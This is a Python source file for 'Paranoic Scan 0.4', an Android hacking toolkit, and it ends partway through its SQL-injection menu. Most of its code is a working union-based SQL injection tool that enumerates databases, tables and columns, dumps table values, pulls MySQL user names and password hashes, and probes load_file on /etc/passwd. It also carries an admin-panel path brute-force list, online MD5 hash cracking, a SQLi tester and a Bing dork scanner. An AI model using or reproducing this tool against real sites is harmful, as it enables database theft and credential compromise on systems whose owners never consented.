#!usr/bin/python
# -*- coding: utf-8 -*-
#################################################################################
#This software is Copyright (c) 2015 by Doddy Hackman.
#
#This is free software, licensed under:
#
#  The Artistic License 1.0
#
#The Artistic License
#
#Preamble
#
#The intent of this document is to state the conditions under which a Package
#may be copied, such that the Copyright Holder maintains some semblance of
#artistic control over the development of the package, while giving the users of
#the package the right to use and distribute the Package in a more-or-less
#customary fashion, plus the right to make reasonable modifications.
#
#Definitions:
#
#  - "Package" refers to the collection of files distributed by the Copyright
#    Holder, and derivatives of that collection of files created through
#    textual modification.
#  - "Standard Version" refers to such a Package if it has not been modified,
#    or has been modified in accordance with the wishes of the Copyright
#    Holder.
#  - "Copyright Holder" is whoever is named in the copyright or copyrights for
#    the package.
#  - "You" is you, if you're thinking about copying or distributing this Package.
#  - "Reasonable copying fee" is whatever you can justify on the basis of media
#    cost, duplication charges, time of people involved, and so on. (You will
#    not be required to justify it to the Copyright Holder, but only to the
#    computing community at large as a market that must bear the fee.)
#  - "Freely Available" means that no fee is charged for the item itself, though
#    there may be fees involved in handling the item. It also means that
#    recipients of the item may redistribute it under the same conditions they
#    received it.
#
#1. You may make and give away verbatim copies of the source form of the
#Standard Version of this Package without restriction, provided that you
#duplicate all of the original copyright notices and associated disclaimers.
#
#2. You may apply bug fixes, portability fixes and other modifications derived
#from the Public Domain or from the Copyright Holder. A Package modified in such
#a way shall still be considered the Standard Version.
#
#3. You may otherwise modify your copy of this Package in any way, provided that
#you insert a prominent notice in each changed file stating how and when you
#changed that file, and provided that you do at least ONE of the following:
#
#  a) place your modifications in the Public Domain or otherwise make them
#     Freely Available, such as by posting said modifications to Usenet or an
#     equivalent medium, or placing the modifications on a major archive site
#     such as ftp.uu.net, or by allowing the Copyright Holder to include your
#     modifications in the Standard Version of the Package.
#
#  b) use the modified Package only within your corporation or organization.
#
#  c) rename any non-standard executables so the names do not conflict with
#     standard executables, which must also be provided, and provide a separate
#     manual page for each non-standard executable that clearly documents how it
#     differs from the Standard Version.
#
#  d) make other distribution arrangements with the Copyright Holder.
#
#4. You may distribute the programs of this Package in object code or executable
#form, provided that you do at least ONE of the following:
#
#  a) distribute a Standard Version of the executables and library files,
#     together with instructions (in the manual page or equivalent) on where to
#     get the Standard Version.
#
#  b) accompany the distribution with the machine-readable source of the Package
#     with your modifications.
#
#  c) accompany any non-standard executables with their corresponding Standard
#     Version executables, giving the non-standard executables non-standard
#     names, and clearly documenting the differences in manual pages (or
#     equivalent), together with instructions on where to get the Standard
#     Version.
#
#  d) make other distribution arrangements with the Copyright Holder.
#
#5. You may charge a reasonable copying fee for any distribution of this
#Package.  You may charge any fee you choose for support of this Package. You
#may not charge a fee for this Package itself. However, you may distribute this
#Package in aggregate with other (possibly commercial) programs as part of a
#larger (possibly commercial) software distribution provided that you do not
#advertise this Package as a product of your own.
#
#6. The scripts and library files supplied as input to or produced as output
#from the programs of this Package do not automatically fall under the copyright
#of this Package, but belong to whomever generated them, and may be sold
#commercially, and may be aggregated with this Package.
#
#7. C or perl subroutines supplied by you and linked into this Package shall not
#be considered part of this Package.
#
#8. The name of the Copyright Holder may not be used to endorse or promote
#products derived from this software without specific prior written permission.
#
#9. THIS PACKAGE IS PROVIDED "AS IS" AND WITHOUT ANY EXPRESS OR IMPLIED
#WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
#MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
#
#The End
#
#################################################################################
#Paranoic Scan 0.4
#Android Version
#(C) Doddy Hackman 2015
#################################################################################
 
import android,urllib2,socket,binascii,re,base64,hashlib
 
webvul = ""
 
# Functions
 
def hexencoder(texto):
 return "[+] Result : "+"0x"+str(binascii.hexlify(texto))
 
def hexdecoder(texto):
 text = re.sub("0x","",texto)
 return "[+] Result : "+binascii.unhexlify(text)
 
def base64encoder(texto):
 return "[+] Result : "+base64.b64encode(texto)
 
def base64decoder(texto):
 return "[+] Result : "+base64.b64decode(texto)
 
def md5encoder(texto):
 return "[+] Result : "+hashlib.md5(texto).hexdigest()
 
def reem(texto,parte):
 return re.sub(parte,"hackman",texto)
 
def regexver(code):
 if (re.findall("K0BRA(.*?)K0BRA",code)):
  return True
 else:
  return False
 
def regexdar(code):
 if (re.findall("K0BRA(.*?)K0BRA",code)):
  return re.findall("K0BRA(.*?)K0BRA",code)[0]
 
def toma(web) :
 nave = urllib2.Request(web)
 nave.add_header('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5');
 op = urllib2.build_opener()
 return op.open(nave).read()
 
def tomar(web,vars) :
 nave = urllib2.build_opener()
 nave.add_header = [('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5')]
 return nave.open(web,vars).read()
 
def getdata(web) :
 nave = urllib2.Request(web)
 nave.add_header('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5');
 op = urllib2.build_opener()
 return op.open(nave).info()
 
def bypass(bypass):
 if bypass == "--":
  return("+","--")
 elif bypass == "/*":
  return("/**/","/**/")
 else:
  return("+","--")
 
def showtables(web):
 pass1,pass2 = bypass("--")
 respuesta = ""
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(table_name),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,table_name,0x4b30425241)))",web)
 code1 = toma(web1+pass1+"from"+pass1+"information_schema.tables"+pass2)
 respuesta = respuesta + "[+] Searching tables ...\n\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "[+] Tables Found : "+numbers+"\n\n" 
  for counter in range(17,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+"information_schema.tables"+pass1+"limit"+pass1+repr(counter)+",1"+pass2)
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    table = re.findall("K0BRA(.*?)K0BRA",code2)
    table = table[0]
    respuesta = respuesta + "[Table Found] : "+table+"\n"
 else:
  respuesta = respuesta + "[-] Not Found\n"
 respuesta = respuesta + "\n[+] Finished"
 return respuesta
 
def showcolumns(web,tabla):
 respuesta = ""
 pass1,pass2 = bypass("--")
 tabla2 = tabla
 tabla = "0x"+str(binascii.hexlify(tabla))
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(column_name),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,column_name,0x4b30425241)))",web)
 code1 = toma(web1+pass1+"from"+pass1+"information_schema.columns"+pass1+"where"+pass1+"table_name="+tabla+pass2)
 respuesta = respuesta + "[+] Searching columns ...\n\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "[+] Columns Found : "+numbers+"\n"  
  for counter in range(0,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+"information_schema.columns"+pass1+"where"+pass1+"table_name="+tabla+pass1+"limit"+pass1+repr(counter)+",1"+pass2)
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    column = re.findall("K0BRA(.*?)K0BRA",code2)
    column = column[0]
    respuesta = respuesta + "\n[Column Found in table "+str(tabla2)+"] : "+str(column)
 else:
  respuesta = respuesta + "[-] Not Found"
 respuesta = respuesta + "\n\n[+] Finished"
 return respuesta
 
def showdbs(web):
 respuesta = ""
 pass1,pass2 = bypass("--")
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,schema_name,0x4b30425241)))",web)
 code1 = toma(web1+pass1+"from"+pass1+"information_schema.schemata"+pass2)
 respuesta = respuesta + "[+] Searching DBS ...\n\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "[+] DBS Found : "+numbers+"\n"      
  for counter in range(0,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+"information_schema.schemata"+pass1+"limit"+pass1+repr(counter)+",1"+pass2)
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    db = re.findall("K0BRA(.*?)K0BRA",code2)
    db = db[0]
    respuesta = respuesta + "\n[DB Found] : "+db
 else:
  respuesta = respuesta + "[-] Not Found"
 respuesta = respuesta + "\n\n[+] Finished"
 return respuesta
 
def dumper(web,table,col1,col2):
 respuesta = ""
 pass1,pass2 = bypass("--")
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,"+col1+",0x4b30425241,0x4B3042524131,"+col2+",0x4B3042524131)))",web)
 code1 = toma(web1+pass1+"from"+pass1+table+pass2)
 respuesta = respuesta + "[+] Searching values ...\n\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "[+] Values Found : "+numbers+"\n"   
  for counter in range(0,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+table+pass1+"limit"+pass1+repr(counter)+",1"+pass2)    
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    c1 = re.findall("K0BRA(.*?)K0BRA",code2)
    c1 = c1[0]
    c2 = re.findall("K0BRA1(.*?)K0BRA1",code2)
    c2 = c2[0]
    respuesta = respuesta + "\n["+col1+"] : "+c1+"\n"
    respuesta = respuesta + "["+col2+"] : "+c2+"\n"
 else:
  respuesta = respuesta + "[-] Not Found\n"
 respuesta = respuesta + "\n[+] Finished"
 return respuesta
 
def mysqluser(web):
 pass1,pass2 = bypass("--")
 respuesta = ""
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,Host,0x4b30425241,0x4B3042524131,User,0x4B3042524131,0x4B3042524132,Password,0x4B3042524132)))",web)
 code1 = toma(web1+pass1+"from"+pass1+"mysql.user"+pass2)
 respuesta = respuesta + "[+] Searching mysql.user ...\n\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "[+] Users Found : "+numbers+"\n"    
  for counter in range(0,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+"mysql.user"+pass1+"limit"+pass1+repr(counter)+",1"+pass2)
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    host = re.findall("K0BRA(.*?)K0BRA",code2)
    host = host[0]
    user = re.findall("K0BRA1(.*?)K0BRA1",code2)
    user = user[0]
    passw = re.findall("K0BRA2(.*?)K0BRA2",code2)
    passw = passw[0]
    respuesta = respuesta + "\n[Host] : "+host
    respuesta = respuesta + "\n[User] : "+user
    respuesta = respuesta + "\n[Pass] : "+passw+"\n"    
 else:
  respuesta = respuesta + "[-] Not Found\n"
 respuesta = respuesta + "\n[+] Finished"
 return respuesta
 
def showcolumnsdb(web,db,table):
 respuesta = ""
 db2 = db
 table2 = table
 db = "0x"+str(binascii.hexlify(db))
 table = "0x"+str(binascii.hexlify(table))
 pass1,pass2 = bypass("--")
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,column_name,0x4b30425241)))",web)
 code1 = toma(web1+pass1+"from"+pass1+"information_schema.columns"+pass1+"where"+pass1+"table_name="+table+pass1+"and"+pass1+"table_schema="+db+pass2) 
 respuesta = respuesta + "[+] Searching columns in DB ...\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "\n[+] Columns Found : "+str(numbers)+"\n"   
  for counter in range(0,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+"information_schema.columns"+pass1+"where"+pass1+"table_name="+table+pass1+"and"+pass1+"table_schema="+db+pass1+"limit"+pass1+repr(counter)+",1"+pass2)
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    column = re.findall("K0BRA(.*?)K0BRA",code2)
    column = column[0]
    respuesta = respuesta + "\n[Column Found] : "+str(column)
 else:
  respuesta = respuesta + "\n[-] Not Found"
 respuesta = respuesta + "\n\n[+] Finished"
 return respuesta
 
def showtablesdb(web,db):
 respuesta = ""
 db2 = db
 db = "0x"+str(binascii.hexlify(db))
 pass1,pass2 = bypass("--")
 web1 = re.sub("hackman","unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(0x4b30425241,table_name,0x4b30425241)))",web)
 code1 = toma(web1+pass1+"from"+pass1+"information_schema.tables"+pass1+"where"+pass1+"table_schema="+db+pass2)
 respuesta = respuesta + "[+] Searching tables in DB ...\n\n"
 if (re.findall("K0BRA(.*?)K0BRA",code1)):
  numbers = re.findall("K0BRA(.*?)K0BRA",code1)
  numbers = numbers[0]
  respuesta = respuesta + "[+] Tables Found : "+str(numbers)+"\n"      
  for counter in range(0,int(numbers)):
   code2 = toma(web2+pass1+"from"+pass1+"information_schema.tables"+pass1+"where"+pass1+"table_schema="+db+pass1+"limit"+pass1+repr(counter)+",1"+pass2)
   if (re.findall("K0BRA(.*?)K0BRA",code2)):
    table = re.findall("K0BRA(.*?)K0BRA",code2)
    table = table[0]
    respuesta = respuesta + "\n[Table Found] : "+table
 else:
  respuesta = respuesta + "[-] Not Found"
 respuesta = respuesta + "\n\n[+] Finished"
 return respuesta
 
def more(web):
 respuesta = ""
 pass1,pass2 = bypass("--")
 otraweb = web
 respuesta = respuesta + "[+] Searching DB Details ...\n"
 hextest = "0x2f6574632f706173737764"
 web1 = re.sub("hackman","unhex(hex(concat(0x334d50335a3452,0x4b30425241,user(),0x4b30425241,database(),0x4b30425241,version(),0x4b30425241,0x334d50335a3452)))",web)
 web2 = re.sub("hackman","unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file("+hextest+"))))",otraweb)
 code0 = toma(web1+pass2)
 if (re.findall("3MP3Z4R(.*?)3MP3Z4R",code0)):
  datax = re.findall("3MP3Z4R(.*?)3MP3Z4R",code0)
  datar = re.split("K0BRA",datax[0])
  respuesta = respuesta + "\n[+] Username : "+datar[1]
  respuesta = respuesta + "\n[+] Database : "+datar[2]
  respuesta = respuesta + "\n[+] Version : "+datar[3]+"\n"
 
 code1 = toma(web1+pass1+"from"+pass1+"mysql.user"+pass2)
 if (re.findall("K0BRA",code1)):
   respuesta = respuesta + "\n[+] mysql.user : on"
 code2 = toma(web1+pass1+"from"+pass1+"information_schema.tables"+pass2)
 if (re.findall("K0BRA",code2)):
   respuesta = respuesta + "\n[+] information_schema.tables : on"
 codetres = toma(web2)
 if (re.findall("ERTOR854",codetres)):
  respuesta = respuesta + "\n[+] load_file() : on"
 respuesta = respuesta + "\n\n[+] Finished"
 return respuesta
 
def httpfinger(target):
 respuesta = ""
 try:
  respuesta = respuesta + str(getdata(target))
 except:
  respuesta = respuesta + "[-] Error"
 return respuesta
 
def scanpanel(web):
 contador = 0
 panels=['admin/admin.asp','admin/login.asp','admin/index.asp','admin/admin.aspx','admin/login.aspx','admin/index.aspx','admin/webmaster.asp','admin/webmaster.aspx','asp/admin/index.asp','asp/admin/index.aspx','asp/admin/admin.asp','asp/admin/admin.aspx','asp/admin/webmaster.asp','asp/admin/webmaster.aspx','admin/','login.asp','login.aspx','admin.asp','admin.aspx','webmaster.aspx','webmaster.asp','login/index.asp','login/index.aspx','login/login.asp','login/login.aspx','login/admin.asp','login/admin.aspx','administracion/index.asp','administracion/index.aspx','administracion/login.asp','administracion/login.aspx','administracion/webmaster.asp','administracion/webmaster.aspx','administracion/admin.asp','administracion/admin.aspx','php/admin/','admin/admin.php','admin/index.php','admin/login.php','admin/system.php','admin/ingresar.php','admin/administrador.php','admin/default.php','administracion/','administracion/index.php','administracion/login.php','administracion/ingresar.php','administracion/admin.php','administration/','administration/index.php','administration/login.php','administrator/index.php','administrator/login.php','administrator/system.php','system/','system/login.php','admin.php','login.php','administrador.php','administration.php','administrator.php','admin1.html','admin1.php','admin2.php','admin2.html','yonetim.php','yonetim.html','yonetici.php','yonetici.html','adm/','admin/account.php','admin/account.html','admin/index.html','admin/login.html','admin/home.php','admin/controlpanel.html','admin/controlpanel.php','admin.html','admin/cp.php','admin/cp.html','cp.php','cp.html','administrator/','administrator/index.html','administrator/login.html','administrator/account.html','administrator/account.php','administrator.html','login.html','modelsearch/login.php','moderator.php','moderator.html','moderator/login.php','moderator/login.html','moderator/admin.php','moderator/admin.html','moderator/','account.php','account.html','controlpanel/','controlpanel.php','controlpanel.html','admincontrol.php','admincontrol.html','adminpanel.php','adminpanel.html','admin1.asp','admin2.asp','yonetim.asp','yonetici.asp','admin/account.asp','admin/home.asp','admin/controlpanel.asp','admin/cp.asp','cp.asp','administrator/index.asp','administrator/login.asp','administrator/account.asp','administrator.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','moderator/admin.asp','account.asp','controlpanel.asp','admincontrol.asp','adminpanel.asp','fileadmin/','fileadmin.php','fileadmin.asp','fileadmin.html','administration.html','sysadmin.php','sysadmin.html','phpmyadmin/','myadmin/','sysadmin.asp','sysadmin/','ur-admin.asp','ur-admin.php','ur-admin.html','ur-admin/','Server.php','Server.html','Server.asp','Server/','wp-admin/','administr8.php','administr8.html','administr8/','administr8.asp','webadmin/','webadmin.php','webadmin.asp','webadmin.html','administratie/','admins/','admins.php','admins.asp','admins.html','administrivia/','Database_Administration/','WebAdmin/','useradmin/','sysadmins/','admin1/','system-administration/','administrators/','pgadmin/','directadmin/','staradmin/','ServerAdministrator/','SysAdmin/','administer/','LiveUser_Admin/','sys-admin/','typo3/','panel/','cpanel/','cPanel/','cpanel_file/','platz_login/','rcLogin/','blogindex/','formslogin/','autologin/','support_login/','meta_login/','manuallogin/','simpleLogin/','loginflat/','utility_login/','showlogin/','memlogin/','members/','login-redirect/','sub-login/','wp-login/','login1/','dir-login/','login_db/','xlogin/','smblogin/','customer_login/','UserLogin/','login-us/','acct_login/','admin_area/','bigadmin/','project-admins/','phppgadmin/','pureadmin/','sql-admin/','radmind/','openvpnadmin/','wizmysqladmin/','vadmind/','ezsqliteadmin/','hpwebjetadmin/','newsadmin/','adminpro/','Lotus_Domino_Admin/','bbadmin/','vmailadmin/','Indy_admin/','ccp14admin/','irc-macadmin/','banneradmin/','sshadmin/','phpldapadmin/','macadmin/','administratoraccounts/','admin4_account/','admin4_colon/','radmind-1/','Super-Admin/','AdminTools/','cmsadmin/','SysAdmin2/','globes_admin/','cadmins/','phpSQLiteAdmin/','navSiteAdmin/','server_admin_small/','logo_sysadmin/','server/','database_administration/','power_user/','system_administration/','ss_vms_admin_sm/']
 respuesta = ""
 respuesta = respuesta + "[+] Scanning ...\n"
 for path in panels:
  try:
   toma(web+"/"+path)
   respuesta = respuesta + "\n[+] Link : "+web+"/"+path
   contador = contador + 1
  except urllib2.URLError, e:
   pass
 
 if(contador==0) :
  respuesta = respuesta + "\n[+] Not Found"
 respuesta = respuesta + "\n\n[+] Finished"
 return respuesta
 
def crackmd5(md5) :
 respuesta = ""
 code = tomar("http://md5online.net/index.php","pass="+md5+"&option=hash2text&send=Submit")
 if (re.findall("<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>",code)):
  rex = re.findall("<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>",code)
  return "[+] Hash : "+rex[0][1]
 else:
  code = tomar("http://md5decryption.com/index.php","hash="+md5+"&submit=Decrypt It!")
  if (re.findall("Decrypted Text: <\/b>(.*?)<\/font>",code)):
   rex = re.findall("Decrypted Text: <\/b>(.*?)<\/font>",code)
   return "[+] Hash : "+rex[0]
  else:
   code = tomar("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php","md5="+md5)
   if (re.findall("<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>",code)):
    rex = re.findall("<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>",code)
    return "[+] Hash : "+rex[0]
   else:
    return "[+] Hash : Not Found"
 return respuesta
 
def locateip(pagina):
 
 respuesta = ""
 
 ip = socket.gethostbyname(str(pagina))
 code = tomar("http://www.melissadata.com/lookups/iplocation.asp?ipaddress=","ipaddress="+ip+"&Submit=submit")
 
 respuesta = respuesta + "[++] IP Address Location\n"
 
 if (re.findall("City<\/td><td align=(.*)><b>(.*)<\/b><\/td>",code)):
  rex = re.findall("City<\/td><td align=(.*)><b>(.*)<\/b><\/td>",code)
  city = rex[0][1]
  respuesta = respuesta + "\n[++] City : "+city
 else:
  respuesta = respuesta + "\n[++] City : Not Found"
 
 if (re.findall("Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>",code)):
  rex = re.findall("Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>",code)
  country = rex[0][1]
  respuesta = respuesta + "\n[++] Country : "+country
 else:
  respuesta = respuesta + "\n[++] Country : Not Found"
 
 if (re.findall("State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>",code)):
  rex = re.findall("State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>",code)
  state = rex[0][1]
  respuesta = respuesta + "\n[++] State : "+state
 else:
  respuesta = respuesta + "\n[++] State : Not Found"

 code = toma("http://www.ip-adress.com/reverse_ip/"+ip)
 
 if (re.findall("whois\/(.*?)\">Whois",code)):
  rex = re.findall("whois\/(.*?)\">Whois",code)
  respuesta = respuesta + "\n\n[++] DNS Founds\n"
  for dns in rex:
   if not dns == "":
    respuesta = respuesta + "\n[+] "+dns
 
 return respuesta
 
def sqltest(webs):
 respuesta = ""
 for web in webs :
  if re.findall("=",web):
   web = re.split("=",web)
   web = web[0]+"="
 
   try:
    code = toma(web+"-1+union+select+1--")
    if (re.findall("The used SELECT statements have a different number of columns",code,re.I)):
     respuesta = respuesta + "[SQLI] : "+web+"\n"
   except:
    pass
 return respuesta
 
def limpiar(pag):
 
 limpia = []
 for p in pag:
  if p not in limpia:
   limpia.append(p)
 return limpia
 
def bingscan(dork,count):
 
 respuesta = ""
 
 pag = []
 s = 10  
 
 while s <= int(count):
  try:
   code = toma("http://www.bing.com/search?q="+str(dork)+"&first="+str(s))
   d = re.findall("<h3><a href=\"(.*?)\"",code,re.I)
   e = re.findall("<h2><a href=\"(.*?)\"",code,re.I)
   s += 10
   for a in d:
    pag.append(a)
   for b in e:
    pag.append(b)
 
  except:
   pass
 
 pag = limpiar(pag)
 
 return pag
 
 
##
 
aplicacion = android.Android()
 
def menuencoder():
 
 aplicacion.dialogCreateAlert("Encoders")
 aplicacion.dialogSetItems(["MD5 Encoder","Base64 Encoder","Base64 Decoder","Hex Encoder","Hex Decoder","Exit"])
 aplicacion.dialogShow()
 reh = aplicacion.dialogGetResponse().result
 reb = reh["item"]
 
 if reb==0:
 
  aplicacion.dialogCreateAlert("MD5 Encoder")
 
  aplicacion.dialogGetInput("MD5 Encoder","Enter Text")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menuencoder()
  else:
   texto = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("MD5 Encoder","[+] Encoding ...")
   aplicacion.dialogShow()
 
   don = md5encoder(texto)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("MD5 Encoder",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menuencoder()
 
 
 if reb==1 :
 
  aplicacion.dialogCreateAlert("Base64 Encoder")
 
  aplicacion.dialogGetInput("Base64 Encoder","Enter Text")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menuencoder()
  else:
   texto = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("Base64 Encoder","[+] Encoding ...")
   aplicacion.dialogShow()
 
   don = base64encoder(texto)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("Base64 Encoder",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menuencoder()
 
 if reb==2 :
 
  aplicacion.dialogCreateAlert("Base64 Decoder")
 
  aplicacion.dialogGetInput("Base64 Decoder","Enter Text")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menuencoder()
  else:
   texto = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("Base64 Decoder","[+] Encoding ...")
   aplicacion.dialogShow()
 
   don = base64decoder(texto)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("Base64 Decoder",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menuencoder()
 
 if reb==3 :
 
  aplicacion.dialogCreateAlert("Hex Encoder")
 
  aplicacion.dialogGetInput("Hex Encoder","Enter Text")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menuencoder()
  else:
   texto = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("Hex Encoder","[+] Encoding ...")
   aplicacion.dialogShow()
 
   don = hexencoder(texto)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("Hex Encoder",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menuencoder()
 
 
 if reb==4 :
 
  aplicacion.dialogCreateAlert("Hex Decoder")
 
  aplicacion.dialogGetInput("Hex Decoder","Enter Text")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menuencoder()
  else:
   texto = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("Hex Decoder","[+] Encoding ...")
   aplicacion.dialogShow()
 
   don = hexdecoder(texto)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("Hex Decoder",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menuencoder()
 
 if reb==5:
  menu()
 
def menusql():
 
 aplicacion.dialogCreateAlert("SQLI Scanner")
 aplicacion.dialogSetItems(["Get Tables","Get Columns","Get Databases","Get Tables of DB","Get Columns of DB","Get mysql.users","Get Details DB","Dump Values","Exit"])
 aplicacion.dialogShow()
 reez = aplicacion.dialogGetResponse().result
 opsql = reez["item"]
 
 if opsql==0:
         
  aplicacion.dialogCreateAlert("SQLI Scanner")
  aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Searching Tables ...")
  aplicacion.dialogShow()
 
  don = showtables(webvul)
 
  aplicacion.dialogDismiss()
 
  aplicacion.dialogCreateAlert("SQLI Scanner",don)
  aplicacion.dialogSetPositiveButtonText("Done")
  aplicacion.dialogShow()
 
  op = aplicacion.dialogGetResponse().result
 
  if op["which"] == "positive" :
   menusql()
   
 if opsql==1 :
         
  aplicacion.dialogCreateAlert("SQLI Scanner")
 
  aplicacion.dialogGetInput("SQLI Scanner","Enter Table")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menusql()
  else:  
   tabla = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Searching Columns ...")
   aplicacion.dialogShow()
 
   don = showcolumns(webvul,tabla)
   
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("SQLI Scanner",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menusql()
   
 if opsql==2 :
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
  aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Searching Databases ...")
  aplicacion.dialogShow()
 
  don = showdbs(webvul)
 
  aplicacion.dialogDismiss()
 
  aplicacion.dialogCreateAlert("SQLI Scanner",don)
  aplicacion.dialogSetPositiveButtonText("Done")
  aplicacion.dialogShow()
 
  op = aplicacion.dialogGetResponse().result
 
  if op["which"] == "positive" :
   menusql()
   
 if opsql==3 :
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
 
  aplicacion.dialogGetInput("SQLI Scanner","Enter DB Name")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menusql()
  else:  
   db = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Searching Tables of DB ...")
   aplicacion.dialogShow()
 
   don = showtablesdb(webvul,db)
   
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("SQLI Scanner",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menusql()
 
 if opsql==4 :
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
 
  aplicacion.dialogGetInput("SQLI Scanner","Enter DB Name")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menusql()
  else:  
   db = ref['value']
 
   aplicacion.dialogGetInput("SQLI Scanner","Enter Table")
   ref = aplicacion.dialogGetResponse().result
 
   if not ref['which'] == 'positive' :
    menusql()
   else:
